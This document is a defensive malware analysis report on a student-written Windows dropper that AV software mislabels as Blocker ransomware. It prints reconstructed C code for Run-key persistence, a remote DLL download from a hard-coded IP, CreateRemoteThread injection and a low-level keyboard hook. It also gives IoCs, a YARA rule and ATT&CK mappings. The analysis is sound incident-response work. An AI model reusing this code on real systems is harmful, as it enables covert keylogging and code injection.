# UDS-Trojan-Ransom.Win32.Blocker.gen — Detailed Analysis

Language: English | French version: [README.md](README.md)

**Sample (local file):** `UDS-Trojan-Ransom.Win32.Blocker.gen-f9a97d0e…ac94`  
**SHA256 (file content):** `a1858f5e497309fb46acd71e0dbdc6959975ece7345fe7b565484547253677f9`  
**Kaspersky detection:** `UDS-Trojan-Ransom.Win32.Blocker.gen` — **generic / heuristic name**  
**Actual nature:** student assignment (`malware_assignment`) — dropper + keylogger + DLL injection, **not** classic Blocker ransomware  
**Toolchain:** PE32 console, MSVC 19.41 / VS2022 17.11 LTCG (DIE)  
**Sources:** PE + Hex-Rays 9.4 (`artefacts/ida_export/*.c`) + extracted RCDATA resource  

> **Defensive / IR** analysis only. No host-side malware execution.  
> The hash embedded in the **filename** (`f9a97d0e…ac94`) **does not match** the content SHA256 (`a1858f5e…`) — both are documented.

---

## 0. Hex-Rays ↔ behaviour summary

| Observation | Code confirmation |
|-------------|-------------------|
| PDB `malware_assignment` + user `aaa` | CodeView string in `.rdata` |
| Hides console window | `AllocConsole` → `FindWindowA("ConsoleWindowClass")` → `ShowWindow(..., 0)` |
| Copies self to `%ProgramData%\app_data.exe` | `SHGetFolderPathW(CSIDL_COMMON_APPDATA=35)` + `CopyFileW` |
| Run persistence | `HKCU\...\Run` value **`Persistence`** |
| Drops keylogger from resource | `FindResourceW(101, RT_RCDATA)` → `%APPDATA%\keylogger_hook.exe` + `ShellExecuteW` |
| Downloads a DLL | `URLDownloadToFileW(http://210.125.101.75/payload.dll → C:\payload.dll)` |
| Injects into the debugger | Looks for **`x32dbg.exe`**, then `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread(LoadLibraryW)` |
| WH_KEYBOARD_LL keylogger | Embedded PE: `SetWindowsHookExW(13, …)` → log to `C:\Program Files (x86)\note.txt` |
| Encryption / ransom note / wallpaper | **Absent** — the AV “Blocker / Ransom” label is misleading |

**One-liner:** on start, the program hides itself, copies under a bland name, registers for logon, extracts and launches a keylogger, downloads `payload.dll`, then tries to inject it into **x32dbg** if that process is running — classic **malware-dev homework**, not a ransomware campaign.

---

## 1. Entry point — `main` @ `0x401040`

### What is this for? (non-expert)

Think of a five-step “demo kit”, always in the same order:

1. Become quiet (no visible black console; original file marked hidden).  
2. Copy into a rarely browsed system folder (`ProgramData`) as `app_data.exe`.  
3. Tell Windows: “start me again at every logon” (Run key).  
4. Unpack a second program (keylogger) from its own resources and run it.  
5. Download a DLL from the Internet and, **if the x32dbg debugger is open**, force that process to load it.

There is **no** disk walk, **no** document encryption, **no** ransom wallpaper.

### PE (reminder)

| Field | Value |
|-------|--------|
| SHA256 | `a1858f5e497309fb46acd71e0dbdc6959975ece7345fe7b565484547253677f9` |
| MD5 | `f70b586e3306cd84c29e123a65226196` |
| SHA1 | `09bc2b7399499093f0ed36bfeab458846213689c` |
| Filename tag | `f9a97d0e6d8e8129f62f47b652d26ea7a27f1996760a41c6c9730062a601ac94` (**≠** content) |
| Machine | PE32 (`0x14C`), console, `asInvoker` |
| TimeDateStamp | **2024-11-21 05:14:45 UTC** (`0x673ec1C5`) |
| EP RVA | `0x15E9` — ImageBase `0x400000` |
| Packer | None (small size, normal sections, clear strings) |
| PDB | `C:\Users\aaa\source\repos\malware_assignment\Release\malware_assignment.pdb` |
| Size | 22,528 bytes |

### Clean code (flow)

```c
// main @ 0x401040 — artefacts/cleaned_main_dropper.c
AllocConsole();
ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);

GetModuleFileNameW(NULL, self, ...);
SetFileAttributesW(self, FILE_ATTRIBUTE_HIDDEN);

SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA /*35*/, ..., dest);
wcscat_s(dest, L"\\app_data.exe");
CopyFileW(self, dest, FALSE);

RegOpenKeyExW(HKCU, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
RegSetValueExW(hk, L"Persistence", 0, REG_SZ, path_to_app_data_exe, 0x208);

hrsrc = FindResourceW(NULL, MAKEINTRESOURCEW(0x65), RT_RCDATA); // id 101
// → WriteFile %APPDATA%\keylogger_hook.exe + ShellExecuteW("open", ...)

URLDownloadToFileW(NULL,
    L"http://210.125.101.75/payload.dll",
    L"C:\\payload.dll", 0, NULL);

// process snapshot → if szExeFile == L"x32dbg.exe" → PID
// OpenProcess(PROCESS_ALL_ACCESS) → VirtualAllocEx →
// WriteProcessMemory(..., L"C:\\payload.dll", 0x1E) →
// CreateRemoteThread(..., LoadLibraryW, remote_buf)
```

---

## 2. Persistence and file stealth

### What is this for?

Without admin elevation (`asInvoker`), the malware sticks to what a standard user can do:

- mark **its own** `.exe` as **hidden** (`FILE_ATTRIBUTE_HIDDEN = 2`) — Explorer hides it by default;  
- duplicate into **`%ProgramData%`** (`C:\ProgramData\app_data.exe`) — shared folder, deliberately “app-like” name;  
- write **`HKCU\...\Run\Persistence`** to survive reboot **for the current user profile**.

### What IR sees

| Artefact | Value |
|----------|--------|
| File | `%ProgramData%\app_data.exe` (copy of the sample) |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `Persistence` = path above |
| Attribute | Original (+ copy) potentially `H` |

**Why:** classic Run-key lab exercise — no service, no scheduled task, no WMI.

---

## 3. Keylogger drop (RCDATA resource 101)

### What is this for?

The dropper **embeds** a second PE (10,240 bytes) as a Windows **RCDATA** resource, id **101** (`0x65`). At runtime it writes it to `%APPDATA%\keylogger_hook.exe` and starts it via the shell (`ShellExecuteW`, `nShowCmd = 10` = `SW_SHOWDEFAULT`).

Same pattern as a legitimate installer unpacking a helper — except the helper installs a **keyboard hook**.

### Extraction (already done)

| File | SHA256 | Role |
|------|--------|------|
| [`artefacts/resources/keylogger_hook.exe`](artefacts/resources/keylogger_hook.exe) | `f74483530cc72874f5d10ebab521ea2ef47f3b319d1986b99dcf355384d35b9c` | Extracted PE |
| [`artefacts/resources/RCDATA_101_1042.bin`](artefacts/resources/RCDATA_101_1042.bin) | same | raw resource dump |
| Manifest | — | `asInvoker` only |

Second binary PDB:  
`C:\Users\aaa\source\repos\keylogger_hook\Release\keylogger_hook.pdb`  
(same user `aaa`, same VS2022 17.11 toolchain).

---

## 4. Keylogger — `main` @ `0x401060` / hook `fn` @ `0x401000`

### What is this for?

The child program:

1. also hides its console;  
2. installs a **`WH_KEYBOARD_LL` (13)** hook — “low-level listen to every key in the session”;  
3. runs a Windows message loop to keep the hook alive;  
4. on each `WM_KEYDOWN` (256), opens `C:\Program Files (x86)\note.txt` in append mode and writes.

### Clean code

```c
// keylogger_hook — artefacts/cleaned_main_keylogger.c
hhk = SetWindowsHookExW(WH_KEYBOARD_LL /*13*/, fn, NULL, 0);
puts(hhk ? "All is good" : "Something went wrong :(");
while (GetMessageW(...) > 0) { TranslateMessage(...); DispatchMessageW(...); }

// callback fn
fopen("C:\\Program Files (x86)\\note.txt", "a+");
if (wParam == 256) { fputs((char *)lParam, stream); fclose(stream); }
return CallNextHookEx(...);
```

### Bugs / limits (visible in Hex-Rays)

| Issue | Impact |
|-------|--------|
| `lParam` cast to `char *` + `fputs` | For an LL hook, `lParam` points to `KBDLLHOOKSTRUCT`, **not** a string — nonsense writes / frequent crash |
| `GetMessageW(lpMsg, …)` with never-allocated global `lpMsg` | Hex-Rays shows a global pointer never `malloc`’d — incomplete student code |
| Path under `Program Files (x86)` | Often **access denied** without admin |
| Console messages `All is good` | Invisible (window hidden) unless redirected |

**For IR:** even broken, the **presence** of the PE, the hook APIs, and the `note.txt` path remain useful IoCs.

---

## 5. Download + injection into `x32dbg.exe`

### What is this for?

Two teaching ideas glued together:

1. **Downloader:** `URLDownloadToFileW` pulls `http://210.125.101.75/payload.dll` to `C:\payload.dll` (system root — often denied without elevation).  
2. **Classic LoadLibrary injection:** Toolhelp process walk, find **`x32dbg.exe`**, open with `PROCESS_ALL_ACCESS`, allocate memory, write the Unicode path `C:\payload.dll` (0x1E bytes), create a remote thread on `kernel32!LoadLibraryW`.

### Why `x32dbg`?

Typical **lab** target: the student runs the malware **from** or **next to** their debugger and “sees” the DLL load into x32dbg. Real malware would usually target `explorer.exe`, a browser, etc. Explicit debugger targeting betrays the homework context.

### IP `210.125.101.75`

| Field | Value |
|-------|--------|
| Country | South Korea (KR) |
| Range | `210.125.96.0/21` — **Sungshin Women’s University** (KREONet / KISTI) |
| Observed use | Single hard-coded URL `…/payload.dll` |

Consistent with PDB `Users\aaa\...` and a course / student host — **not** a known ransomware C2.

### What we do **not** have

- Remote file `payload.dll` was **not** downloaded or executed in this analysis (no-host-exec policy).  
- If PID stays `-1` (x32dbg absent), `OpenProcess` / the rest fail silently — no rich error handling.

---

## 6. Side effects / what is **missing**

| Expected “Blocker ransomware” | Present? |
|-------------------------------|----------|
| File encryption | No |
| Ransom note / BTC / onion | No |
| Wallpaper / defacement | **No** — see [`artefacts/wallpaper_README.txt`](artefacts/wallpaper_README.txt) |
| VSS / bcdedit wipe | No |
| Named mutex | Not observed |
| Anti-debug beyond x32dbg target | `IsDebuggerPresent` imported (CRT), no business logic |

Only UI camouflage: hide `ConsoleWindowClass`.

---

## 7. Logical timeline (one run)

```
t0  AllocConsole + hide console
t1  SetFileAttributesW(self, HIDDEN)
t2  CopyFile → %ProgramData%\app_data.exe
t3  RegSetValueExW Run\Persistence
t4  Extract RCDATA 101 → %APPDATA%\keylogger_hook.exe → ShellExecute
t5  URLDownloadToFileW → C:\payload.dll
t6  Enum processes ; if x32dbg.exe → inject LoadLibraryW(C:\payload.dll)
t7  return 0
     └─ (parallel) keylogger_hook : WH_KEYBOARD_LL + append note.txt
```

---

## 8. IoCs

See also [`artefacts/iocs.txt`](artefacts/iocs.txt).

### Hashes

| Object | SHA256 |
|--------|--------|
| Dropper (content) | `a1858f5e497309fb46acd71e0dbdc6959975ece7345fe7b565484547253677f9` |
| Embedded keylogger | `f74483530cc72874f5d10ebab521ea2ef47f3b319d1986b99dcf355384d35b9c` |
| Folder name tag | `f9a97d0e6d8e8129f62f47b652d26ea7a27f1996760a41c6c9730062a601ac94` |

Dropper MD5: `f70b586e3306cd84c29e123a65226196`  
Keylogger MD5: `ab971710cf5ea9d60010ade57c831b6f`

### Network / files / registry

| Type | IoC |
|------|-----|
| URL | `http://210.125.101.75/payload.dll` |
| IP | `210.125.101.75` |
| DLL drop | `C:\payload.dll` |
| Copy | `%ProgramData%\app_data.exe` |
| Keylogger | `%APPDATA%\keylogger_hook.exe` |
| Log | `C:\Program Files (x86)\note.txt` |
| Run | `HKCU\...\Run` / `Persistence` |
| Target process | `x32dbg.exe` |

### YARA (defensive sketch)

```yara
rule UDS_Blocker_gen_malware_assignment
{
  meta:
    description = "Student dropper malware_assignment / keylogger_hook"
  strings:
    $pdb1 = "malware_assignment.pdb" ascii
    $pdb2 = "keylogger_hook.pdb" ascii
    $url  = "210.125.101.75/payload.dll" wide
    $run  = "Persistence" wide
    $dbg  = "x32dbg.exe" wide
  condition:
    uint16(0) == 0x5A4D and 3 of them
}
```

---

## 9. MITRE ATT&CK

| ID | Technique | Evidence |
|----|-----------|----------|
| T1055.001 | Process Injection: Dynamic-link Library Injection | `CreateRemoteThread` + `LoadLibraryW` into `x32dbg` |
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | `...\Run\Persistence` |
| T1105 | Ingress Tool Transfer | `URLDownloadToFileW` |
| T1056.001 | Input Capture: Keylogging | `SetWindowsHookExW(WH_KEYBOARD_LL)` |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | `FILE_ATTRIBUTE_HIDDEN` |
| T1620 | Reflective Code Loading / (embedded resource) | PE in `RT_RCDATA` 101 |
| T1036.005 | Masquerading: Match Legitimate Name or Location | `app_data.exe` under `ProgramData` |
| T1059 / exec | User Execution / Shell | `ShellExecuteW` on the keylogger |

*No* T1486 (Data Encrypted for Impact) despite the AV name.

---

## 10. Verdict / classification

| Label | Comment |
|-------|---------|
| Kaspersky `UDS-Trojan-Ransom.Win32.Blocker.gen` | **Generic** “Blocker” + UDS family; **does not match** observed behaviour |
| Proposed IR class | **Trojan.Win32.Dropper / Keylogger** (assignment) — loader + WH_KEYBOARD_LL + lab inject |
| Lab severity | Low sophistication, clear strings, obvious bugs; mainly dangerous if real `payload.dll` + admin rights |

---

## 11. Deliverables

| Path | Content |
|------|---------|
| [`README.md`](README.md) / [`README_EN.md`](README_EN.md) | This report |
| [`artefacts/blocker_gen.exe`](artefacts/blocker_gen.exe) | Working copy of the sample |
| [`artefacts/ida_export/blocker_gen.{c,asm,lst}`](artefacts/ida_export/) | Hex-Rays dropper |
| [`artefacts/ida_export/keylogger_hook.{c,asm,lst}`](artefacts/ida_export/) | Hex-Rays keylogger |
| [`artefacts/resources/keylogger_hook.exe`](artefacts/resources/keylogger_hook.exe) | Extracted PE (RCDATA 101) |
| [`artefacts/cleaned_main_dropper.c`](artefacts/cleaned_main_dropper.c) | Annotated reconstruction |
| [`artefacts/cleaned_main_keylogger.c`](artefacts/cleaned_main_keylogger.c) | Same for keylogger |
| [`artefacts/iocs.txt`](artefacts/iocs.txt) | Condensed IoCs |
| [`artefacts/wallpaper_README.txt`](artefacts/wallpaper_README.txt) | Documented wallpaper absence |

---

## 12. Not verified / out of scope

- Sandbox execution (Any.RUN / local) — **not done**; no Any.RUN URL provided; public APIs returned *Not Found* for both SHA256s.  
- Live content of `http://210.125.101.75/payload.dll` — **not fetched** (no-exec / no deployment assistance).  
- Fresh multi-AV detections on VirusTotal (JS-heavy page).  
- Possible correlation of filename hash `f9a97d0e…` with a **different** VirusShare sample.

---

## 13. References

- Hex-Rays IDA Pro 9.4 batch (`~/ida-pro-9.4`, script `export_asm_c.py`)  
- Detect It Easy — MSVC 19.41 / VS2022 17.11  
- KRNIC whois — Sungshin Women’s University range (`210.125.96.0/21`)  
- [`../AGENTS.md`](../AGENTS.md) — Articles methodology
